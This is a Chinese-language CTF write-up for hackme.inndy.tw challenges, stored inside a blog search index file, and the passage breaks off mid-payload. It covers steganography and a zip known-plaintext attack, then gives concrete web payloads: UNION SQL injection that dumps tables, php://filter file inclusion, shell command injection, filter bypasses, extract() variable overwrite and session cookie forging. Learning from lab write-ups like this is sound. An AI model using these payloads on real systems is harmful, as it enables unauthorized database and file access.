<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>hackme笔记</title>
    <link href="/2020/04/20/hackme%20%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/04/20/hackme%20%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p> <a href="https://hackme.inndy.tw/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0">https://hackme.inndy.tw/做题笔记</a></p><p>​      <a id="more"></a>            </p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>图片：<a href="https://www.freebuf.com/column/205244.html">https://www.freebuf.com/column/205244.html</a></p><h3 id="corgi-can-fly"><a href="#corgi-can-fly" class="headerlink" title="corgi can fly"></a>corgi can fly</h3><p>stegslove: <a href="https://www.cnblogs.com/cat47/p/11483478.html">https://www.cnblogs.com/cat47/p/11483478.html</a></p><p>点击几次下方的箭号，就可以看见一个二维码，扫，得到flag</p><p><a href="https://blog.csdn.net/qq_41628669/article/details/90214758">https://blog.csdn.net/qq_41628669/article/details/90214758</a></p><p>television</p><p>下载c32asm,用它打开图片，搜索flag即可</p><h3 id="MEOW"><a href="#MEOW" class="headerlink" title="MEOW"></a>MEOW</h3><p>打开是一张图片</p><p>下载</p><p>kali里binwalk一波</p><p>binwalk meow.png</p><p>foremost一波：</p><p>foremost meow.png</p><p>在目录下会出现一个<code>output</code>文件夹</p><p><img src="https://raw.githubusercontent.com/atsap0/hexopictures/master/20200502212121.png"></p><p>发现只有png文件夹下有一个00000000.png，zip文件夹下有一个00000094.zip</p><p>解压缩命令：</p><p><code>unzip -v 00000094.zip</code></p><p>先分析一下这个zip文件</p><p>发现压缩包中还有个png图片，其CRC32值是cdad52bd</p><p>而原来00000000.png的CRC32值也是cdad52bd</p><ul><li>这里的00000000.png的CRC32值是先通过运行下面两行命令得到的 </li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">zip</span> <span class="hljs-selector-tag">plain</span><span class="hljs-selector-class">.zip</span> 00000000<span class="hljs-selector-class">.png</span> <span class="hljs-selector-tag">unzip</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">plain</span><span class="hljs-selector-class">.zip</span></code></pre><p>于是这个zip存在明文攻击，于是把压缩00000000.png得到的plain.zip和00000094.zip放到pkcrack的文件夹下，利用命令</p><pre><code class="hljs stylus">./pkcrack -C <span class="hljs-number">00000094</span><span class="hljs-selector-class">.zip</span> -c meow/t39.<span class="hljs-number">1997</span>-<span class="hljs-number">6</span>/p296x100/<span class="hljs-number">10173502</span>_279586372215628_1950740854_n<span class="hljs-selector-class">.png</span> -P plain<span class="hljs-selector-class">.zip</span>  -<span class="hljs-selector-tag">p</span> <span class="hljs-number">00000000</span><span class="hljs-selector-class">.png</span> -d result<span class="hljs-selector-class">.zip</span> -a</code></pre><p>得到一个result.zip</p><p>result.zip里面就有我们要找到flag</p><ul><li><p>ctf这类文件分离的题目，大多时候可以使用<code>binwalk</code>或者<code>winhex</code>也可以使用<code>dd</code>命令</p><p>可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost</p></li><li><p>上述命令的意思是把00000000.png这个图片压缩成一个名为plain.zip的压缩包 unzip -v plain.zip的意思是分析这个plain.zip压缩包中有什么文件</p></li><li><p>明文攻击<br>这是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件，此时我们可以尝试用ARCHPR或者pkcrack进行明文攻击~</p></li></ul><h3 id="where-is-flag"><a href="#where-is-flag" class="headerlink" title="where is flag"></a>where is flag</h3><p>regular expression正则表达式</p><p>打开，下载一个文件flag.zip</p><p>解压</p><p>kali里</p><p>cat flag | grep -oP FLAG{[a-zA-Z0-9]*}</p><p>匹配出flag</p><h3 id="slow"><a href="#slow" class="headerlink" title="slow"></a>slow</h3><p>爆破脚本</p><p><img src="https://raw.githubusercontent.com/atsap0/hexopictures/master/20200502235918.png"></p><p><a href="https://l1b0.fun/7003/">https://l1b0.fun/7003/</a></p><h3 id="pusheen-txt"><a href="#pusheen-txt" class="headerlink" title="pusheen.txt"></a>pusheen.txt</h3><p>下载下来，猫猫图案坏掉了</p><p>猜测两个图像分别代表0和1</p><p>用这位师傅的脚本：<a href="http://blog.iyzyi.com/index.php/archives/1105/">http://blog.iyzyi.com/index.php/archives/1105/</a></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;pusheen.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<span class="hljs-keyword">as</span> f:    s = f.read()a = <span class="hljs-string">&#x27;&#x27;&#x27;   ▐▀▄       ▄▀▌   ▄▄▄▄▄▄▄</span><span class="hljs-string">   ▌  ▀▄▄▄▄▄▀  ▐▄▀▀ ██ ██ ▀▀▄</span><span class="hljs-string">  ▐    ▀ ▀ ▀                 ▀▄</span><span class="hljs-string">  ▌               ▄            ▀▄</span><span class="hljs-string">▀█   █▌  █  ▐█   ▀               ▌</span><span class="hljs-string">▀▌      ▀ ▀      ▀▀              ▐   ▄▄</span><span class="hljs-string">▐                                 ▌▄█ █</span><span class="hljs-string">▐                                 █ █▀</span><span class="hljs-string">▐                                 █▀</span><span class="hljs-string">▐                                 ▌</span><span class="hljs-string"> ▌                               ▐</span><span class="hljs-string"> ▐                               ▌</span><span class="hljs-string">  ▌                             ▐</span><span class="hljs-string">  ▐▄                           ▄▌</span><span class="hljs-string">    ▀▄▄▀▀▀▀▀▄▄▀▀▀▀▀▀▀▄▄▀▀▀▀▀▄▄▀</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>b = <span class="hljs-string">&#x27;&#x27;&#x27;   ▐▀▄       ▄▀▌   ▄▄▄▄▄▄▄</span><span class="hljs-string">   ▌▒▒▀▄▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄</span><span class="hljs-string">  ▐▒▒▒▒▀▒▀▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄</span><span class="hljs-string">  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▀▄</span><span class="hljs-string">▀█▒▒▒█▌▒▒█▒▒▐█▒▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌</span><span class="hljs-string">▀▌▒▒▒▒▒▒▀▒▀▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐   ▄▄</span><span class="hljs-string">▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█</span><span class="hljs-string">▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒█▀</span><span class="hljs-string">▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▀</span><span class="hljs-string">▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌</span><span class="hljs-string"> ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐</span><span class="hljs-string"> ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌</span><span class="hljs-string">  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐</span><span class="hljs-string">  ▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌</span><span class="hljs-string">    ▀▄▄▀▀▀▀▀▄▄▀▀▀▀▀▀▀▄▄▀▀▀▀▀▄▄▀</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>s = s.replace(a,<span class="hljs-string">&#x27;0&#x27;</span>).replace(b,<span class="hljs-string">&#x27;1&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)print(s)</code></pre><p>转换成0，1</p><p>然后转换成16进制，转换成字符串</p><p>得到flag</p><h3 id="big"><a href="#big" class="headerlink" title="big"></a>big</h3><p>下载一个 big.xxz,</p><p>file命令探测！</p><p>file big.xxz</p><p>显示：big.xxz: XZ compressed data</p><p>是后缀名被改了，但是文件的格式还是xz，</p><p>所以我们重命名为big.xz</p><p>解压一次得到 big.xz.</p><p><code>xz -d big.xxz</code></p><p> 里面是个 16G 的 <code>big</code> 文件</p><p>xzcat ：查看xz文件内容</p><p>发现都是 <code>THISisNOTFLAG&#123;&#125;</code>, </p><p>可以用</p><pre><code class="hljs 1c">xzcat big<span class="hljs-string">|tail -n 1</span></code></pre><p>查看文件末尾一行</p><p>grep支持使用 -v参数反向查找。所以可以</p><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;THISisNOTFLAG&#123;&#125;&quot;</span> big</code></pre><p>就能很快找到</p><p>GNU grep 比 BSD grep 快很多。所以使用 BSD 类系统（包括 macOS）自带的 grep 会非常非常慢。</p><p>cat filename |tail -n 1   //显示最后一行</p><p>cat filename |head -n 1  //显示最开头一行</p><p>cat filename |tail -n +1  //从第一行开始显示以后所有行</p><p>cat filename|head -n 500 |tail -n +1 100  //显示一百行到500行</p><h3 id="otaku"><a href="#otaku" class="headerlink" title="otaku"></a>otaku</h3><p>第一张图片Kuroyuki_Hime.png</p><p>strings Kuroyuki_Hime.png</p><p>得到</p><p>FAKE{D1d y0u u5ed br41n bur5t?}</p><p>第二张，放进stegsolve</p><p><img src="https://raw.githubusercontent.com/atsap0/hexopictures/master/20200504114327.png"></p><p>第四张</p><p>binwalk -e一下</p><p>出来了个文件</p><p><img src="https://raw.githubusercontent.com/atsap0/hexopictures/master/20200504155204.png"></p><p>第三张</p><p><a href="https://diamondi.github.io/2018/12/27/otaku/%EF%BC%9A">https://diamondi.github.io/2018/12/27/otaku/：</a></p><p><img src="https://raw.githubusercontent.com/atsap0/hexopictures/master/20200504151613.png"></p><p>这样的吗？</p><p>Σ( ° △ °|||)︴我的表情也是这样的</p><p>misc总结：<a href="https://xz.aliyun.com/u/6978">https://xz.aliyun.com/u/6978</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>15.</p><p>直接查看源码，发现flag</p><ol start="16"><li><p>题目提示是sql注入</p></li></ol><p>进入题目,显示no data for this</p><p>于是就写一篇博客，submit，显示成功，到messagelist查询博客内容，</p><pre><code class="hljs awk">url:https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=<span class="hljs-number">14</span></code></pre><p>猜测查询的语句是select * from … where id=…把id=4改成?id= ‘ 不能查看博文内容，url上存在注入点，发现是数字型注入，字段数是4，然后</p><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+</span></code></pre><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-comment">--+</span></code></pre><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span> <span class="hljs-comment">--+</span></code></pre><ul><li>fuzz<br> 模糊测试（Fuzzing），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。</li></ul><p>17.</p><p>提示：LFI ,<code>php://filter</code></p><p>查看源码发现了提示：  ?page=pages/flag</p><p>文件包含漏洞介绍：</p><p><a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/80699051">https://blog.csdn.net/fageweiketang/article/details/80699051</a></p><p>阅读这篇文章理解为何构造payload</p><p>(文中有如何绕过阻止写入一句话的<code>exit</code>)</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>payload：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/lfi/</span>?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=pages/flag</code></pre><p>得到提示，base64解码得到：</p><p>Can you read the flag<?php require('config.php'); ?>?</p><p>构造resources=pages/config，得到一串提示，base64解码得到flag</p><p>18.</p><p>chrome里console有一个二维码，扫一扫就得到flag了</p><p>还发现了好多颜文字，是cute.js</p><p>19.</p><pre><code class="hljs autoit">exec(<span class="hljs-string">&quot;ping -c 1 \&quot;</span>&#123;$ip&#125;\<span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>, $ret)<span class="hljs-comment">;</span></code></pre><p>可以看到，我们的输入会和“ping -c 1”和“2&gt;&amp;1”一起当作命令执行，$ret是命令执行后的输出</p><p> 2&amp;&gt;1解释：</p><p>将标准错误输出重定向到标准输出</p><p>（<a href="https://blog.csdn.net/zhaominpro/article/details/82630528%EF%BC%89">https://blog.csdn.net/zhaominpro/article/details/82630528）</a></p><p>题目过滤了很多东西</p><p>没被题目过滤的查看文件的：</p><pre><code class="hljs properties"><span class="hljs-attr">tac</span>  <span class="hljs-string">从最后一行开始显示，可以看出 tac 是 cat 的倒着写</span><span class="hljs-attr">more</span> <span class="hljs-string">一页一页的显示档案内容 </span><span class="hljs-attr">less</span> <span class="hljs-string">与 more 类似，但是比 more 更好的是，他可以往前翻页</span><span class="hljs-attr">head</span> <span class="hljs-string">只看头几行 </span><span class="hljs-attr">tail</span> <span class="hljs-string">只看尾巴几行 </span><span class="hljs-attr">nl</span>   <span class="hljs-string">显示的时候，顺道输出行号</span><span class="hljs-attr">sort</span> <span class="hljs-string">能将文件进行排序输出</span></code></pre><p>我们在框里输入：$(ls) 或` ls`</p><p>（将一个命令执行的结果赋给一个变量，格式为：<strong>myvar=$(command)</strong> 或`command`</p><p>Shell可以先执行反引号或$（）中的命令，将输出结果暂时保存，在适当的地方输出。语法:`command`）</p><p>出现了flag.php,输入</p><p><code>$(tac f*)</code>(通配符)</p><p>或</p><p><code>sort ????????</code></p><p>……</p><p>可以看到flag.php内容了</p><ul><li><p>命令执行常见绕过</p><p><a href="https://blog.csdn.net/silence1_/article/details/96135760">https://blog.csdn.net/silence1_/article/details/96135760</a></p></li><li><p><a href="https://blog.csdn.net/luansj/article/details/97272672">https://blog.csdn.net/luansj/article/details/97272672</a></p></li><li><p>linux中单引号’ ,双引号”, 反引号 , $, $(), ${}与变量：</p><p><a href="https://blog.csdn.net/qq_40491569/article/details/83688652">https://blog.csdn.net/qq_40491569/article/details/83688652</a></p></li></ul><p>20.</p><p>抓包，可以在header找到flag</p><p><em>Header can hide some data aswell.</em></p><p>21.</p><p>str_replace(“ ‘ “, “\\‘“, $str)  把<code>&#39;</code>换成<code>\&#39;</code></p><p>绕过方法：</p><p><code>admin\&#39;</code></p><p>转义两次，最后剩下一个单引号，可以闭合了</p><p>or 1=1被过滤了，可以用|| 1=1 ，or 2=2也行</p><p>如果login failed，打开burpsuite，使用repeater可以看到sql语句</p><p>php 当把其它类型的数据转换为布尔时候，只区分非0与0，非0值为true，0值为false</p><p>看到注释：</p><pre><code class="hljs php"><span class="hljs-comment">// table schema// user -&gt; id, user, password, is_admin</span></code></pre><p>user表有四列，</p><p>几种方法：</p><pre><code class="hljs sql">1. \&#x27;+or+`user`=&quot;admin&quot;<span class="hljs-comment">--+  </span>\\ 语句：<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-string">`user`</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-string">`user`</span> =<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">`user`</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">user</span>是<span class="hljs-keyword">admin</span>，<span class="hljs-keyword">sql</span>语句没有错误，is_admin也成立，获得flag<span class="hljs-number">2.</span> \<span class="hljs-string">&#x27;+union+select+1,2,3,1--+  </span><span class="hljs-string"></span><span class="hljs-string">\\ 语句：</span><span class="hljs-string">SELECT * FROM `user` WHERE `user` =&#x27;&#x27; union select 1,2,3,1 </span><span class="hljs-string">is_admin的值为1，获得flag</span><span class="hljs-string"></span><span class="hljs-string">3. \&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> limit1,<span class="hljs-number">1</span><span class="hljs-comment">#</span>\\ 语句：<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span> limit1，<span class="hljs-number">1</span><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span> 我们会得到整个<span class="hljs-keyword">user</span>表。但是只有整张表的第一个会被验证，所以这个payload提交上去发现我们不是管理员而是guest，猜想<span class="hljs-keyword">admin</span>应该是在下一条数据因此加上limit1，<span class="hljs-number">1</span></code></pre><ul><li><p>sprintf注入：<a href="https://www.cnblogs.com/qingwuyou/p/10687463.html">https://www.cnblogs.com/qingwuyou/p/10687463.html</a></p></li><li><p>sprintf注入题目：<a href="https://blog.csdn.net/WQ_BCJ/article/details/85215662">https://blog.csdn.net/WQ_BCJ/article/details/85215662</a></p></li></ul><p>22.</p><p>第一个flag找到后同时获得提示：第二个flag在database里</p><p>直接联合查询就可以</p><p>从<code>user -&gt; id, user, password, is_admin</code>得知user表的列名</p><p>构造：</p><pre><code class="hljs sql">\&#x27;+union+<span class="hljs-keyword">select</span>+<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>+<span class="hljs-keyword">password</span>+<span class="hljs-keyword">from</span>+<span class="hljs-keyword">user</span>+<span class="hljs-keyword">limit</span>+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span></code></pre><p>查看列内容</p><p>没有找到信息，爆表</p><pre><code class="hljs sql">\&#x27;+union+<span class="hljs-keyword">select</span>+<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>+<span class="hljs-keyword">concat</span>(table_name)+<span class="hljs-keyword">from</span>+information_schema.tables+<span class="hljs-keyword">where</span>+table_schema=<span class="hljs-keyword">database</span>()+<span class="hljs-keyword">limit</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span></code></pre><p>发现一个叫h1dden_f14g的表</p><p>爆列，（表名要加双引号）</p><p>最后：</p><pre><code class="hljs sql">\&#x27;+union+<span class="hljs-keyword">select</span>+<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>+the_f14g+<span class="hljs-keyword">from</span>+h1dden_f14g+<span class="hljs-keyword">limit</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span></code></pre><p>获得flag</p><ol start="23"><li><p>查看源码</p><p>发现safe_filter里改变了一些过滤，过滤了空格，<code>union select</code>，<code>union（一个空格）  </code> 等，于是用/**/代替空格</p><p>可以构造payload</p><pre><code class="hljs gauss">name=admin\&#x27;<span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">/**/</span><span class="hljs-meta">#</span></code></pre><p>和前一题差不多的样子</p><ul><li><p>substr()可以截取字符串，flag太长可以用</p></li><li><p>substring:</p><p>string substring(string, start, length)</p><p>ascii和substring一起使用用计算字符串第二个以后的ascii值</p><p><code>select ASCII(SUBSTRING(&#39;database&#39;,2,1));</code></p></li></ul></li></ol><ol start="23"><li><p>是盲注，因为有login failed可以判断，所以用布尔注入</p><p>试图用sqlmap temper，失败了</p><p>要自己写，最后好像flag有很多个字</p></li></ol><ol start="24"><li><p>setcokkie：<a href="https://www.w3school.com.cn/php/func_http_setcookie.asp">https://www.w3school.com.cn/php/func_http_setcookie.asp</a></p><p>dd。。</p><ul><li>从 PHP 4.4 之后，header（）防止一次发送多个报头。这是对头部注入攻击的保护措施</li></ul></li></ol><ol start="26"><li><p>查看源码：</p><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>): <span class="hljs-comment">/* login success! */</span> <span class="hljs-meta">?&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-success&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?=</span>$flag<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] !== <span class="hljs-variable">$password</span>) &#123;     <span class="hljs-regexp">//</span> show failed message <span class="hljs-keyword">if</span> you input wrong password      header(<span class="hljs-string">&#x27;Location: ./?failed=1&#x27;</span>);  &#125;</code></pre><p>只要name值是admin，就能获得flag</p><p>但是password不正确会强制跳转，于是我们可以抓包，在响应包里找到flag</p></li><li><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;    <span class="hljs-keyword">try</span> &#123;        $data = json_decode($_POST[<span class="hljs-string">&#x27;data&#x27;</span>], <span class="hljs-literal">true</span>);    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> $e) &#123;        $data = [];    &#125;    extract($data);    <span class="hljs-keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="hljs-number">0</span>) &#123;        $user = $username;    &#125;&#125;</code></pre></li></ol><pre><code>如果username和password比较==0，user的值就是username所以username=“admin”并且构造password为空数组使strcmp返回0（原因见链接）但是guest用这种方法可以成功登录，admin不行应该是users数组里面没有“admin”所以只能利用extract（）漏洞了可以通过我们提交的变量把原来的变量覆盖掉<pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;users&quot;</span>:&#123;<span class="hljs-attr">&quot;admin&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;,<span class="hljs-attr">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:&#123;&#125;&#125;</code></pre>或<pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;users&quot;</span>:&#123;<span class="hljs-attr">&quot;admin&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;,<span class="hljs-attr">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;</code></pre>就可以成功登陆了extract():*该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。**例：$GET[‘test’]=’a’,被extract（）函数处理后，就变成了$test=’a’,有与之同名的变量$test = &#39;&#39;;，将其值覆盖掉。并且get方法传输的gift参数的值也为a。这样，$gift=$content。就可以获得flag。** 别的变量覆盖：https://www.cnblogs.com/drkang/p/8689205.html* strcmp漏洞：https://www.jianshu.com/p/d91c3357b4d3* $_POST和 $HTTP_RAW_POST_DATA区别 : https://www.cnblogs.com/phpper/p/7169621.html</code></pre><ol start="28"><li><p>利用0exxxxxxx==0，题目中是弱类型比较，随意选0e开头的即可</p><p>0e开头的md5值小结：<a href="https://www.cnblogs.com/Oran9e/p/6537204.html">https://www.cnblogs.com/Oran9e/p/6537204.html</a></p></li></ol><ol start="29"><li><p>查看源码：</p><p>if($_GET[‘debug’] === ‘1’) {<br>   $session-&gt;debug();<br>}</p><p>试试直接在url后加上<code>?debug=1</code>，出现：</p><p>Debug mode is not enabled</p><p>不能用</p><p>抓包发现cookie里有一堆东西</p><p>看到大佬解答<a href="https://blog.csdn.net/weixin_42348709/article/details/90400497%EF%BC%9A">https://blog.csdn.net/weixin_42348709/article/details/90400497：</a></p><p>login8sha512 的值直接是 login8cookie的杂凑值</p><ul><li><p>url.parse：</p><p>parse模块：url的解析，合并，编码，解码</p></li><li><p>unquote</p></li><li><p>对url进行解码，把类似”%xx”的字符替换成单个字符</p></li></ul><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parsecookie=<span class="hljs-string">&#x27;O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D&#x27;</span>cookie_decode=urllib.parse.unquote(cookie)<span class="hljs-comment">#url解码</span><span class="hljs-keyword">import</span> hashlibsha512_encode=hashlib.sha512(cookie_decode.encode()).hexdigest()<span class="hljs-comment">#sha512加密</span>print(sha512_encode)</code></pre></li></ol><p>用python编码解码验证，从这里学到的：</p><p><a href="https://giraff3.cn/2018/11/27/Login%20as%20admin%208(hackme%20writeup)/#more">https://giraff3.cn/2018/11/27/Login%20as%20admin%208(hackme%20writeup)/#more</a></p><p>运行结果可以看到与login8sha512一样</p><p>再<code>print(cookie_decode)</code>可以看到cookie解码后的样子：</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:7</span><span class="hljs-selector-pseudo">:&quot;Session&quot;</span><span class="hljs-selector-pseudo">:6</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot; Session debug&quot;</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">19</span>:<span class="hljs-string">&quot; Session debug_dump&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;index.php&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">13</span>:<span class="hljs-string">&quot; Session data&quot;</span>;<span class="hljs-attribute">a</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;user&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:0</span><span class="hljs-selector-pseudo">:&quot;&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;pass&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:0</span><span class="hljs-selector-pseudo">:&quot;&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;is_admin&quot;</span>;<span class="hljs-selector-tag">b</span><span class="hljs-selector-pseudo">:0</span>;&#125;</code></pre><p>login8cookie改成：</p><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Session%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span 